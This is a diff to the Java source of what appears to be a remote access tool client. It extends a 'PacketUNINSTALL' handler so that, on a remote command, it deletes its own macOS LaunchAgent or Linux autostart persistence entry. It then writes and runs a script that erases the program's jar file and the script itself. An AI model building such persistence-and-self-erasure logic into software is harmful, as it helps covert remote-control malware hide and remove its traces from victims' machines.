@@ -7,7 +7,7 @@ import java.util.Random;
 import com.redpois0n.Connection;
 import com.redpois0n.Main;
 import com.redpois0n.WinRegistry;
-import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.utils.Utils;
 
 public class PacketUNINSTALL extends AbstractPacket {
@@ -36,7 +36,19 @@ public class PacketUNINSTALL extends AbstractPacket {
 				text += "del %0";
 				text = text.replace("\n", " & ");
 			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
-				new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Utils.getJarFile().getName().replace(".jar", ".plist")).delete();
+				File startupFile = new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Main.name + ".plist");
+				startupFile.delete();
+				
+				file = new File(fileName + ".sh");
+				
+				text += "#!bin/bash\n";
+				text += "sleep 5\n";
+				text += "rm " + me.getName() + "\n";
+				text += "rm $0\n";
+			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
+				File startupFile = new File(System.getProperty("user.home") + "/.config/autostart/" + Main.name + ".desktop");
+				startupFile.delete();
+				
 				file = new File(fileName + ".sh");
 				
 				text += "#!bin/bash\n";
@@ -52,7 +64,7 @@ public class PacketUNINSTALL extends AbstractPacket {
 
 				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 					Runtime.getRuntime().exec(new String[] { "cmd", "/c", file.getAbsolutePath() });
-				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
 					Runtime.getRuntime().exec(new String[] { "sh", file.getName() });
 				}
 			}
